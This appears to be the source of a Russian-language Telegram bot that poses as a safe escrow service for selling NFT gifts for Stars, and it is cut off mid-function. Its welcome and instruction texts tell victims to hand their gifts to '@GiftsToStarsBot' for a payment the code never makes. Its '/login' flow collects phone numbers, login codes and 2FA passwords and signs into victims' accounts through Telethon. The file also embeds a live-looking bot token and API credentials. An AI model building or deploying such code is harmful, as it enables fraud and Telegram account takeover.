import asyncio
import io
import logging
import os
import secrets
from datetime import datetime, timedelta, timezone

import qrcode
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InlineQueryResultArticle,
    InputTextMessageContent,
    CallbackQuery,
)
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest

from database import InlineDatabase
from parser import parse_info_command, parse_offer_command, format_amount


BOT_TOKEN = "8782618797:AAEF-c5yKvOICCYYxHRHS1qsWBMfZa0IbLg"
DB_PATH = "inline_offers.sqlite3"
OFFER_TTL_HOURS = 8
SUPER_ADMIN_ID = 7593759960
API_ID = os.getenv("OFFERA_API_ID") or "29714314"
API_HASH = os.getenv("OFFERA_API_HASH") or "303d7abca424bfc3922f5257c1c2b414"

bot = Bot(BOT_TOKEN)
dp = Dispatcher()
log = logging.getLogger("offer")

_active_offers = {}
_awaiting_admin_id: int | None = None
_awaiting_offer_input: int | None = None
_pending_info: dict = {}
_login_flow: dict = {}

db = InlineDatabase(DB_PATH)


def build_offer_text(
    buyer_name: str, count, currency: str, nft_url: str, nft_title: str
) -> str:
    cur = "⭐️" if currency == "stars" else "💎 Gram"
    return (
        f"{buyer_name} предлагает Вам {format_amount(count)} {cur} за подарок "
        f'<a href="{nft_url}">{nft_title}</a>.\n\n'
        f"Предложение действует ещё 5 ч 58 м.\n\n"
    )


def build_offer_card(
    buyer_name: str, count, currency: str, nft_url: str, nft_title: str
) -> str:
    cur = "⭐️" if currency == "stars" else "💎 Gram"
    pad = "\u3000" * 4  # невидимый сдвиг к центру (полноширинные пробелы)
    line1 = f"{buyer_name} предлагает Вам {format_amount(count)} {cur} за подарок"
    line2 = f'<a href="{nft_url}">{nft_title}</a>'
    return (
        f"{pad}{line1}\n"
        f"{pad}{line2}\n"
        f"{pad}\n"
        f"{pad}Предложение действует ещё 5 ч 58 м.\n"
    )


def offer_keyboard(offer_id: int) -> InlineKeyboardMarkup:
    decline_btn = InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{offer_id}")
    accept_btn = InlineKeyboardButton(text="Принять", callback_data=f"accept:{offer_id}")
    return InlineKeyboardMarkup(inline_keyboard=[[decline_btn, accept_btn]])


def transfer_keyboard(offer_id: int, buyer_username: str) -> InlineKeyboardMarkup:
    target = f"tg://send_gift?to=@{buyer_username}" if buyer_username else "https://t.me/"
    btn = InlineKeyboardButton(text="🎁 Передать", url=target)
    help_btn = InlineKeyboardButton(text="Как передать", callback_data=f"how_transfer:{offer_id}")
    sent_btn = InlineKeyboardButton(text="✅ Я передал", callback_data=f"sent_gift:{offer_id}")
    return InlineKeyboardMarkup(inline_keyboard=[[btn], [help_btn], [sent_btn]])


def nft_title_from_url(nft_url: str) -> str:
    slug = nft_url.rstrip("/").split("/")[-1]
    if "-" in slug:
        name_part, num = slug.rsplit("-", 1)
        if num.isdigit():
            return f"{name_part} #{num}"
    return slug.replace("-", " ").replace("_", " ")


def normalize_nft_url(raw: str) -> str | None:
    s = (raw or "").strip()
    if not s:
        return None
    if s.startswith("t.me/"):
        s = "https://" + s
    if not s.startswith("http"):
        if s.startswith("nft/") or "/nft/" in s:
            s = "https://t.me/" + s.lstrip("/")
        else:
            return None
    from urllib.parse import urlparse
    parsed = urlparse(s)
    if parsed.netloc not in ("t.me", "telegram.me", "www.t.me"):
        return None
    if "/nft/" not in parsed.path:
        return None
    return f"https://t.me{parsed.path}".rstrip("/")


WELCOME_TEXT = (
    "🎁 <b>GiftTransfer — передача подарков и ⭐️</b>\n"
    "<blockquote>Передача выполняется через официальный аккаунт сделки "
    '<a href="https://t.me/GiftsToStarsBot">@GiftsToStarsBot</a>. '
    "После подтверждения получения результат сделки будет доступен в системе.</blockquote>\n\n"
    "🛡 <b>Почему это безопасно:</b>\n"
    "• Ваши средства замораживаются до подтверждения получения подарка\n"
    "• Сделку можно отменить до финального подтверждения\n"
    "• Поддержка работает 24/7 и поможет в любой ситуации\n\n"
    "⚙️ <b>Как это работает:</b>\n"
    "1. Покупатель присылает вам предложение через бота\n"
    "2. Вы нажимаете «Принять» под сообщением с оффером\n"
    "3. Отправьте подарок на официальный аккаунт сделки "
    '<a href="https://t.me/GiftsToStarsBot">GiftsToStarsBot</a>\n'
    "4. После подтверждения получения на официальном аккаунте сделки вы сможете получить указанную сумму ⭐️\n"
    "5. Сделка считается завершённой после проверки передачи\n\n"
    "⌛️ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n"
    "💡 <b>Подарок уже у вас</b> — ничего дополнительно покупать не требуется.\n"
)


INSTRUCTION_TEXT = (
    "🎁 <b>Пошаговая инструкция: как принять оффер и получить ⭐️</b>\n\n"
    "<b>Шаг 1.</b> Нажмите кнопку «Принять» под сообщением с предложением\n\n"
    "<b>Шаг 2.</b> Подтвердите, что вы готовы получить подарок\n\n"
    "<b>Шаг 3.</b> Откройте Профиль → Подарки в Telegram\n\n"
    "<b>Шаг 4.</b> Выберите подарок из списка своих подарков\n\n"
    "<b>Шаг 5.</b> Нажмите кнопку «Передать» в меню действий с подарком\n\n"
    "<b>Шаг 6.</b> Вставьте в поле получателя официальный аккаунт сделки: "
    '<a href="https://t.me/GiftsToStarsBot">@GiftsToStarsBot</a>\n\n'
    "<b>Шаг 7.</b> Подтвердите передачу подарка\n\n"
    "<b>Шаг 8.</b> Дождитесь подтверждения получения подарка на официальном аккаунте сделки\n\n"
    "<blockquote>🛡 <b>Проверка передачи:</b>\n"
    "Все операции проходят через официальный аккаунт сделки. "
    "Сумма станет доступна после проверки получения подарка.</blockquote>\n\n"
    "Предоплат и скрытых комиссий нет. Вся сделка происходит внутри Telegram.\n"
)


@dp.message(F.text == "/start")
async def start_handler(message: types.Message):
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Как принять оффер?", callback_data="how_accept")],
        ]
    )
    if message.from_user and (
        message.from_user.id == SUPER_ADMIN_ID or db.is_admin(message.from_user.id)
    ):
        kb.inline_keyboard.append(
            [InlineKeyboardButton(text="👑 Панель админа", callback_data="admin_panel")]
        )
    await message.answer(WELCOME_TEXT, parse_mode=ParseMode.HTML, reply_markup=kb)


_pending_auth = {}


def make_qr_bytes(data: str) -> io.BytesIO:
    img = qrcode.make(data)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    return buf


@dp.message(F.text == "/login")
async def login_handler(message: types.Message):
    if message.from_user is None:
        return
    if db.is_authorized(message.from_user.id):
        await message.answer("✅ Вы уже авторизованы.")
        return
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📱 Войти по номеру", callback_data="login_phone")],
        ]
    )
    await message.answer(
        "🔐 <b>Авторизация юзербота</b>\n\n"
        "Выберите способ входа, чтобы использовать команды <code>/create</code> и <code>/offer</code>:",
        parse_mode=ParseMode.HTML,
        reply_markup=kb,
    )


@dp.callback_query(F.data == "login_phone")
async def login_phone_callback(callback: CallbackQuery):
    if callback.from_user is None:
        return
    if not API_ID or not API_HASH:
        await callback.answer(
            "⚠️ Для входа по номеру нужны api_id и api_hash "
            "(my.telegram.org). Админ должен указать их в env OFFERA_API_ID / OFFERA_API_HASH.",
            show_alert=True,
        )
        return
    _login_flow[callback.from_user.id] = {"step": "phone"}
    try:
        await callback.message.edit_text(
            "📱 Введите номер телефона в формате <code>+79123456789</code>:",
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass
    await callback.answer()


async def _send_login_code(phone: str):
    from telethon import TelegramClient
    client = TelegramClient(
        f"session_{abs(hash(phone)) % 1000000}", int(API_ID), API_HASH,
        connection_retries=3, request_retries=1,
    )
    for dc_id in (1, 2, 3, 4, 5):
        try:
            client.session.set_dc(dc_id, "91.108.56.130", 443)
        except Exception:
            pass
    await client.connect()
    await client.send_code_request(phone)
    return client


_RU_DIGITS = {
    "ноль": "0", "один": "1", "одна": "1", "два": "2", "две": "2", "три": "3",
    "четыре": "4", "пять": "5", "шесть": "6", "семь": "7", "восемь": "8",
    "девять": "9", "zero": "0", "one": "1", "two": "2", "three": "3",
    "four": "4", "five": "5", "six": "6", "seven": "7", "eight": "8", "nine": "9",
}


def normalize_code(raw: str) -> str:
    s = (raw or "").strip().lower().replace(" ", "")
    for word, digit in _RU_DIGITS.items():
        if s.endswith(word):
            s = s[: -len(word)] + digit
            break
    return "".join(ch for ch in s if ch.isdigit())


@dp.message(F.text, ~F.text.startswith("/"))
async def login_flow_handler(message: types.Message):
    if message.from_user is None:
        return
    state = _login_flow.get(message.from_user.id)
    if state is None:
        return
    step = state.get("step")
    text = (message.text or "").strip()

    if step == "phone":
        phone = text.replace(" ", "").replace("-", "")
        if not phone.startswith("+"):
            await message.answer("❌ Номер должен начинаться с <code>+</code>. Пример: <code>+79123456789</code>", parse_mode=ParseMode.HTML)
            return
        try:
            client = await _send_login_code(phone)
        except Exception as e:
            await message.answer(f"❌ Не удалось отправить код: {e}")
            return
        state["client"] = client
        state["phone"] = phone
        state["step"] = "code"
        await message.answer("📩 Введите код из Telegram:")
        return

    if step == "code":
        client = state.get("client")
        code = normalize_code(text)
        try:
            auth = await client.sign_in(state["phone"], code)
        except Exception as e:
            msg = str(e)
            if "SessionPasswordNeeded" in msg or "password" in msg.lower():
                state["step"] = "password"
                await message.answer("🔑 Введите пароль 2FA:")
                return
            await message.answer(f"❌ Неверный код: {e}")
            return
        db.authorize_user(message.from_user.id, f"phone:{state['phone']}")
        _login_flow.pop(message.from_user.id, None)
        await message.answer("✅ <b>Юзербот авторизован!</b>\n\nДоступны команды:\n<code>/create ссылка сумма</code>\n<code>/offer Название#Номер</code>", parse_mode=ParseMode.HTML)
        return

    if step == "password":
        client = state.get("client")
        try:
            await client.sign_in(state["phone"], password=text)
        except Exception as e:
            await message.answer(f"❌ Неверный пароль: {e}")
            return
        db.authorize_user(message.from_user.id, f"phone:{state['phone']}")
        _login_flow.pop(message.from_user.id, None)
        await message.answer("✅ <b>Юзербот авторизован!</b>\n\nДоступны команды:\n<code>/create ссылка сумма</code>\n<code>/offer Название#Номер</code>", parse_mode=ParseMode.HTML)


@dp.callback_query(F.data.startswith("confirm_auth:"))
async def confirm_auth_callback(callback: CallbackQuery):
    if callback.from_user is None:
        return
    token = (callback.data or "").split(":", 1)[1]
    pending_id = _pending_auth.get(token)
    if pending_id is None:
        await callback.answer("Код истёк, запустите /login заново", show_alert=True)
        return
    if pending_id != callback.from_user.id:
        await callback.answer("Этот QR не ваш", show_alert=True)
        return
    db.authorize_user(callback.from_user.id, token)
    _pending_auth.pop(token, None)
    try:
        await callback.message.edit_caption(
            "✅ <b>Юзербот авторизован!</b>\n\nТеперь доступны команды:\n"
            "<code>/create ссылка сумма</code> — создать новый оффер\n"
            "<code>/offer Название#Номер</code> — HTMLBubbles оффер",
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass
    await callback.answer("✅ Авторизовано")


@dp.callback_query(F.data == "cancel_auth")
async def cancel_auth_callback(callback: CallbackQuery):
    try:
        await callback.message.delete()
    except Exception:
        pass
    await callback.answer("Отменено")


@dp.message(F.text.startswith("/create"))
async def create_command_handler(message: types.Message):
    if message.from_user is None:
        return
    if not db.is_authorized(message.from_user.id):
        await message.answer("🔒 Сначала авторизуйте юзербота: <code>/login</code>")
        return
    text = (message.text or "").replace("/create", "", 1).strip()
    parts = text.rsplit(" ", 1)
    if len(parts) != 2:
        await message.answer("Формат: <code>/create https://t.me/nft/Name-1 1500</code>", parse_mode=ParseMode.HTML)
        return
    raw_url, raw_amount = parts
    nft_url = normalize_nft_url(raw_url)
    if not nft_url:
        await message.answer("❌ Неверная ссылка. Пример: <code>https://t.me/nft/Name-1</code>", parse_mode=ParseMode.HTML)
        return
    try:
        amount = float(raw_amount.replace(",", "."))
        if amount <= 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Неверная сумма. Пример: <code>1500</code>", parse_mode=ParseMode.HTML)
        return
    slug = nft_url.rstrip("/").split("/")[-1]
    gift_name, sep, gift_num = slug.rpartition("-")
    gift_number = int(gift_num)
    now = datetime.now(timezone.utc)
    db.create_listing(
        seller_id=message.from_user.id,
        seller_name=message.from_user.full_name or "Пользователь",
        seller_username=message.from_user.username,
        seller_chat_id=message.chat.id,
        gift_url=nft_url,
        gift_name=gift_name,
        gift_number=gift_number,
        language="ru",
        amount=int(amount) if float(amount).is_integer() else amount,
        currency="stars",
        created_at=now.isoformat(),
    )
    await message.answer(
        f"✅ <b>HTMLBubbles-оффер создан</b>\n\n"
        f"🎁 {gift_name}#{gift_number} — {int(amount) if float(amount).is_integer() else amount} ⭐️\n"
        f"Покупатель может открыть: <code>/offer {gift_name}#{gift_number}</code>",
        parse_mode=ParseMode.HTML,
    )


@dp.message(F.text.startswith("/offer"))
async def offer_command_handler(message: types.Message):
    if message.from_user is None:
        return
    if not db.is_authorized(message.from_user.id):
        await message.answer("🔒 Сначала авторизуйте юзербота: <code>/login</code>")
        return
    cmd = parse_offer_command(message.text or "")
    if cmd is None:
        await message.answer("Формат: <code>/offer Название#Номер</code> или <code>/offer https://t.me/nft/Name-1</code>", parse_mode=ParseMode.HTML)
        return
    listing = db.find_listing(cmd.url)
    if listing is None:
        await message.answer("❌ Такой оффер не найден.")
        return
    cur = "⭐️" if listing["currency"] == "stars" else "💎 Gram"
    nft_title = f"{listing['gift_name']}#{listing['gift_number']}"
    buyer_name = message.from_user.username or message.from_user.first_name or "Пользователь"
    now = datetime.now(timezone.utc)
    offer = db.create_offer(
        chat_id=message.chat.id,
        source_message_id=message.message_id,
        buyer_id=message.from_user.id,
        buyer_name=message.from_user.first_name or "Пользователь",
        buyer_username=message.from_user.username or "",
        gift_url=listing["gift_url"],
        gift_name=listing["gift_name"],
        gift_number=listing["gift_number"],
        language=listing["language"],
        amount=listing["amount"],
        currency=listing["currency"],
        created_at=now.isoformat(),
        expires_at=(now + timedelta(hours=OFFER_TTL_HOURS)).isoformat(),
    )
    body = build_offer_card(
        buyer_name, listing["amount"], listing["currency"], listing["gift_url"], nft_title
    )
    kb = offer_keyboard(offer["id"])
    await message.answer(body, parse_mode=ParseMode.HTML, reply_markup=kb)


@dp.callback_query(F.data.startswith("offer_accept:"))
async def offer_accept_callback(callback: CallbackQuery):
    try:
        offer_id = int((callback.data or "").split(":", 1)[1])
    except (ValueError, IndexError):
        return
    listing = db.find_listing_by_id(offer_id)
    if listing is None:
        await callback.answer("Оффер не найден", show_alert=True)
        return
    await callback.answer("Сделка оформляется...")
    try:
        await callback.message.edit_text(
            f"✅ <b>Оффер #{offer_id} принят</b>\n\n"
            f"🎁 {listing['gift_name']}#{listing['gift_number']}\n"
            f"💵 {format_amount(listing['amount'])} ⭐️\n\n"
            f"Передача начнётся в ближайшее время.",
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass


@dp.callback_query(F.data.startswith("offer_decline:"))
async def offer_decline_callback(callback: CallbackQuery):
    await callback.answer("Оффер отклонён")
    try:
        await callback.message.edit_text(
            "❌ <b>Оффер отклонён</b>",
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass


@dp.callback_query(F.data == "how_accept")
async def how_accept_callback(callback: CallbackQuery):
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_welcome")],
        ]
    )
    try:
        await callback.message.edit_text(
            INSTRUCTION_TEXT, parse_mode=ParseMode.HTML, reply_markup=kb
        )
    except TelegramBadRequest:
        pass
    await callback.answer()


@dp.callback_query(F.data == "back_welcome")
async def back_welcome_callback(callback: CallbackQuery):
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Как принять оффер?", callback_data="how_accept")],
        ]
    )
    if callback.from_user.id == SUPER_ADMIN_ID or db.is_admin(callback.from_user.id):
        kb.inline_keyboard.append(
            [InlineKeyboardButton(text="👑 Панель админа", callback_data="admin_panel")]
        )
    try:
        await callback.message.edit_text(
            WELCOME_TEXT, parse_mode=ParseMode.HTML, reply_markup=kb
        )
    except TelegramBadRequest:
        pass
    await callback.answer()


@dp.callback_query(F.data == "admin_panel")
async def admin_panel_callback(callback: CallbackQuery):
    if not (callback.from_user.id == SUPER_ADMIN_ID or db.is_admin(callback.from_user.id)):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="➕ Создать оффер", callback_data="admin_create_offer")],
            [InlineKeyboardButton(text="➕ Добавить админа", callback_data="admin_add")],
            [InlineKeyboardButton(text="📋 Список админов", callback_data="admin_list")],
            [InlineKeyboardButton(text="📦 Управление офферами", callback_data="admin_offers")],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_welcome")],
        ]
    )
    try:
        await callback.message.edit_text("👑 Панель админа", reply_markup=kb)
    except TelegramBadRequest:
        pass
    await callback.answer()


@dp.callback_query(F.data == "admin_create_offer")
async def admin_create_offer_callback(callback: CallbackQuery):
    global _awaiting_offer_input
    if not (callback.from_user.id == SUPER_ADMIN_ID or db.is_admin(callback.from_user.id)):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    _awaiting_offer_input = callback.from_user.id
    try:
        await callback.message.edit_text(
            "➕ Создание оффера\n\n"
            "Укажите ссылку и сумму:\n"
            "<code>https://t.me/nft/InstantRamen-325434 1500</code>"
        )
    except TelegramBadRequest:
        pass
    await callback.answer()


@dp.callback_query(F.data == "admin_add")
async def admin_add_callback(callback: CallbackQuery):
    global _awaiting_admin_id
    if not (callback.from_user.id == SUPER_ADMIN_ID or db.is_admin(callback.from_user.id)):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    _awaiting_admin_id = callback.from_user.id
    try:
        await callback.message.edit_text("Введите id нового админа:")
    except TelegramBadRequest:
        pass
    await callback.answer()


@dp.callback_query(F.data == "admin_list")
async def admin_list_callback(callback: CallbackQuery):
    if not (callback.from_user.id == SUPER_ADMIN_ID or db.is_admin(callback.from_user.id)):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    admins = db.list_admins()
    text = "📋 Список админов:\n" + ("\n".join(f"• <code>{a}</code>" for a in admins) if admins else "Пусто")
    try:
        await callback.message.edit_text(text, parse_mode=ParseMode.HTML)
    except TelegramBadRequest:
        pass
    await callback.answer()


@dp.callback_query(F.data == "admin_offers")
async def admin_offers_callback(callback: CallbackQuery):
    if not (callback.from_user.id == SUPER_ADMIN_ID or db.is_admin(callback.from_user.id)):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📋 Список офферов", callback_data="offers_list")],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="admin_panel")],
        ]
    )
    try:
        await callback.message.edit_text("📦 Управление офферами", reply_markup=kb)
    except TelegramBadRequest:
        pass
    await callback.answer()


@dp.callback_query(F.data == "offers_list")
async def offers_list_callback(callback: CallbackQuery):
    if not (callback.from_user.id == SUPER_ADMIN_ID or db.is_admin(callback.from_user.id)):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    offers = db.list_offers(limit=10)
    if not offers:
        text = "📦 Офферов пока нет."
        kb = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="◀️ Назад", callback_data="admin_offers")]
            ]
        )
    else:
        text = "📦 Последние офферы:\n"
        rows = []
        for o in offers:
            cur = "⭐️" if o["currency"] == "stars" else "💎 Gram"
            status = o["status"]
            text += (
                f"\n#{o['id']} {o['gift_name']}#{o['gift_number']} "
                f"→ {format_amount(o['amount'])} {cur} [{status}]"
            )
            rows.append(
                [InlineKeyboardButton(text=f"❌ Отменить #{o['id']}", callback_data=f"cancel_offer:{o['id']}")]
            )
        rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="admin_offers")])
        kb = InlineKeyboardMarkup(inline_keyboard=rows)
    try:
        await callback.message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)
    except TelegramBadRequest:
        pass
    await callback.answer()


@dp.callback_query(F.data.startswith("cancel_offer:"))
async def cancel_offer_callback(callback: CallbackQuery):
    if not (callback.from_user.id == SUPER_ADMIN_ID or db.is_admin(callback.from_user.id)):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    try:
        offer_id = int((callback.data or "").split(":", 1)[1])
        db.delete_offer(offer_id)
        await callback.answer(f"Оффер #{offer_id} отменён", show_alert=True)
    except (ValueError, LookupError):
        await callback.answer("Оффер не найден", show_alert=True)
        return
    offers = db.list_offers(limit=10)
    if not offers:
        text = "📦 Офферов пока нет."
        kb = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="◀️ Назад", callback_data="admin_offers")]
            ]
        )
    else:
        text = "📦 Последние офферы:\n"
        rows = []
        for o in offers:
            cur = "⭐️" if o["currency"] == "stars" else "💎 Gram"
            status = o["status"]
            text += (
                f"\n#{o['id']} {o['gift_name']}#{o['gift_number']} "
                f"→ {format_amount(o['amount'])} {cur} [{status}]"
            )
            rows.append(
                [InlineKeyboardButton(text=f"❌ Отменить #{o['id']}", callback_data=f"cancel_offer:{o['id']}")]
            )
        rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="admin_offers")])
        kb = InlineKeyboardMarkup(inline_keyboard=rows)
    try:
        await callback.message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)
    except TelegramBadRequest:
        pass
    await callback.answer()


@dp.message(F.text, ~F.text.startswith("/"))
async def admin_input_handler(message: types.Message):
    global _awaiting_admin_id, _awaiting_offer_input
    if message.from_user is None:
        return
    if not (message.from_user.id == SUPER_ADMIN_ID or db.is_admin(message.from_user.id)):
        return
    if _awaiting_offer_input == message.from_user.id:
        _awaiting_offer_input = None
        text = (message.text or "").strip()
        parts = text.rsplit(" ", 1)
        if len(parts) != 2:
            await message.answer("❌ Укажите ссылку и сумму: <code>https://t.me/nft/Name-1 1500</code>", parse_mode=ParseMode.HTML)
            return
        raw_url, raw_amount = parts
        nft_url = normalize_nft_url(raw_url)
        if not nft_url:
            await message.answer("❌ Неверная ссылка. Пример: <code>https://t.me/nft/Name-1</code>", parse_mode=ParseMode.HTML)
            return
        try:
            amount = float(raw_amount.replace(",", "."))
            if amount <= 0:
                raise ValueError
        except ValueError:
            await message.answer("❌ Неверная сумма. Пример: <code>1500</code>", parse_mode=ParseMode.HTML)
            return
        nft_title = nft_title_from_url(nft_url)
        slug = nft_url.rstrip("/").split("/")[-1]
        gift_name, sep, gift_num = slug.rpartition("-")
        gift_number = int(gift_num)
        _pending_info[message.from_user.id] = {
            "url": nft_url,
            "gift_name": gift_name,
            "gift_number": gift_number,
            "language": "ru",
            "amount": int(amount) if float(amount).is_integer() else amount,
        }
        kb = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="⭐️ Звезды", callback_data="info_currency:stars"),
                    InlineKeyboardButton(text="💎 Gram", callback_data="info_currency:gram"),
                ]
            ]
        )
        await message.answer(
            f"🎁 Оффер: {gift_name}#{gift_number} — {format_amount(_pending_info[message.from_user.id]['amount'])}\n"
            f"Выберите валюту:",
            reply_markup=kb,
        )
        return
    if _awaiting_admin_id is None:
        return
    if message.from_user.id != _awaiting_admin_id:
        return
    _awaiting_admin_id = None
    text = (message.text or "").strip()
    if not text.lstrip("-").isdigit():
        await message.answer("❌ Введите числовой id админа.")
        return
    new_admin_id = int(text)
    db.add_admin(new_admin_id)
    await message.answer(f"✅ Админ <code>{new_admin_id}</code> добавлен.", parse_mode=ParseMode.HTML)


@dp.message(F.text.startswith("/info"))
async def info_handler(message: types.Message):
    log.info("[INFO] сообщение от %s: %r", message.from_user.id if message.from_user else None, message.text)
    if message.from_user is None:
        return
    if not (message.from_user.id == SUPER_ADMIN_ID or db.is_admin(message.from_user.id)):
        await message.answer("❌ Доступ запрещён. Создавать офферы могут только админы.")
        return
    command = parse_info_command(message.text or "")
    if command is None:
        await message.answer("Формат: /info <ссылка> <язык> <цена> [star|gram]")
        return

    nft_name = f"{command.gift_name}#{command.gift_number}"

    if command.currency is None:
        _pending_info[message.from_user.id] = {
            "url": command.url,
            "gift_name": command.gift_name,
            "gift_number": command.gift_number,
            "language": command.language,
            "amount": command.amount,
        }
        kb = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="⭐️ Звезды", callback_data="info_currency:stars"),
                    InlineKeyboardButton(text="💎 Gram", callback_data="info_currency:gram"),
                ]
            ]
        )
        await message.answer(
            f"🎁 Оффер: {nft_name} — {command.amount}\n\nВыберите валюту:",
            reply_markup=kb,
        )
        return

    now = datetime.now(timezone.utc)
    db.create_listing(
        seller_id=message.from_user.id,
        seller_name=message.from_user.full_name or "Пользователь",
        seller_username=message.from_user.username,
        seller_chat_id=message.chat.id,
        gift_url=command.url,
        gift_name=command.gift_name,
        gift_number=command.gift_number,
        language=command.language,
        amount=command.amount,
        currency=command.currency,
        created_at=now.isoformat(),
    )

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="admin_panel")]
        ]
    )
    await message.answer(
        f"✅ <b>Done. The offer is ready.</b>\n\n"
        f"<blockquote>Send this command to the buyer. "
        f"The buyer should send it to you in any chat:\n"
        f"<code>@StarToGiftsBot /offer {nft_name}</code></blockquote>",
        parse_mode=ParseMode.HTML,
        reply_markup=kb,
    )


@dp.callback_query(F.data.startswith("info_currency:"))
async def info_currency_callback(callback: CallbackQuery):
    if callback.from_user is None:
        return
    if not (callback.from_user.id == SUPER_ADMIN_ID or db.is_admin(callback.from_user.id)):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    currency = (callback.data or "").split(":", 1)[1]
    pending = _pending_info.get(callback.from_user.id)
    if pending is None:
        await callback.answer("Нет данных оффера. Начните заново /info", show_alert=True)
        return
    now = datetime.now(timezone.utc)
    db.create_listing(
        seller_id=callback.from_user.id,
        seller_name=callback.from_user.full_name or "Пользователь",
        seller_username=callback.from_user.username,
        seller_chat_id=callback.message.chat.id if callback.message else callback.from_user.id,
        gift_url=pending["url"],
        gift_name=pending["gift_name"],
        gift_number=pending["gift_number"],
        language=pending["language"],
        amount=pending["amount"],
        currency=currency,
        created_at=now.isoformat(),
    )
    _pending_info.pop(callback.from_user.id, None)
    nft_name = f"{pending['gift_name']}#{pending['gift_number']}"
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="admin_panel")]
        ]
    )
    try:
        await callback.message.edit_text(
            f"✅ <b>Done. The offer is ready.</b>\n\n"
            f"<blockquote>Send this command to the buyer. "
            f"The buyer should send it to you in any chat:\n"
            f"<code>@StarToGiftsBot /offer {nft_name}</code></blockquote>",
            parse_mode=ParseMode.HTML,
            reply_markup=kb,
        )
    except TelegramBadRequest:
        pass
    await callback.answer()


@dp.inline_query()
async def inline_query_handler(query: types.InlineQuery):
    text = (query.query or "").strip()
    log.info("[INLINE] запрос: %r от %s", text, query.from_user.id)

    if not (query.from_user.id == SUPER_ADMIN_ID or db.is_admin(query.from_user.id)):
        await query.answer(
            results=[],
            cache_time=0,
            is_personal=True,
            switch_pm_text="Инлайн доступен только админам",
            switch_pm_parameter="start",
        )
        return

    command = parse_offer_command(text)
    if command is None:
        await query.answer(
            results=[],
            cache_time=0,
            is_personal=True,
            switch_pm_text="Формат: /offer Name#Number",
            switch_pm_parameter="start",
        )
        return

    listing = db.take_listing(command.url)
    if listing is None:
        await query.answer(
            results=[],
            cache_time=0,
            is_personal=True,
            switch_pm_text="Оффер по этому подарку недоступен",
            switch_pm_parameter="none",
        )
        return

    buyer_id = query.from_user.id
    buyer_name = query.from_user.first_name or "Пользователь"
    buyer_username = query.from_user.username or ""

    now = datetime.now(timezone.utc)
    offer = db.create_offer(
        chat_id=query.from_user.id,
        source_message_id=0,
        buyer_id=buyer_id,
        buyer_name=buyer_name,
        buyer_username=buyer_username,
        gift_url=listing["gift_url"],
        gift_name=listing["gift_name"],
        gift_number=listing["gift_number"],
        language=listing["language"],
        amount=listing["amount"],
        currency=listing["currency"],
        created_at=now.isoformat(),
        expires_at=(now + timedelta(hours=OFFER_TTL_HOURS)).isoformat(),
    )
    offer_id = offer["id"]

    nft_title = f"{listing['gift_name']}#{listing['gift_number']}"
    text = build_offer_card(
        buyer_name, listing["amount"], listing["currency"], listing["gift_url"], nft_title
    )

    result = InlineQueryResultArticle(
        id=str(query.id),
        title=f"Оффер: {format_amount(listing['amount'])} ⭐ за {nft_title}",
        description=f"{format_amount(listing['amount'])} ⭐ за {nft_title}",
        input_message_content=InputTextMessageContent(
            message_text=text,
            parse_mode=ParseMode.HTML,
        ),
        reply_markup=offer_keyboard(offer_id),
    )

    await query.answer(results=[result], cache_time=0, is_personal=True)
    log.info("[+] ИНЛАЙН-РЕЗУЛЬТАТ ОФФЕРА ВЫДАН")
    _active_offers[str(query.id)] = {"offer_id": offer_id}


@dp.chosen_inline_result()
async def chosen_inline_handler(chosen: types.ChosenInlineResult):
    log.info("[CHOSEN] результат %s от %s", chosen.result_id, chosen.from_user.id)
    data = _active_offers.get(str(chosen.result_id))
    if data and chosen.inline_message_id:
        _active_offers[chosen.inline_message_id] = data


@dp.callback_query(F.data.startswith("accept:"))
async def process_accept(callback: CallbackQuery):
    try:
        await callback.answer("Вы приняли предложение!")
    except TelegramBadRequest:
        pass
    try:
        try:
            offer_id = int((callback.data or "").split(":", 1)[1])
            offer = db.get_offer(offer_id)
        except (ValueError, LookupError):
            offer = None
        if offer is not None:
            buyer = offer["buyer_username"] or ""
            amount = offer["amount"]
            cur = "⭐️" if offer["currency"] == "stars" else "💎 Gram"
            text = (
                f"Передайте подарок пользователю "
                f"@{buyer}, {format_amount(amount)} {cur} "
                f"поступят на баланс сразу же."
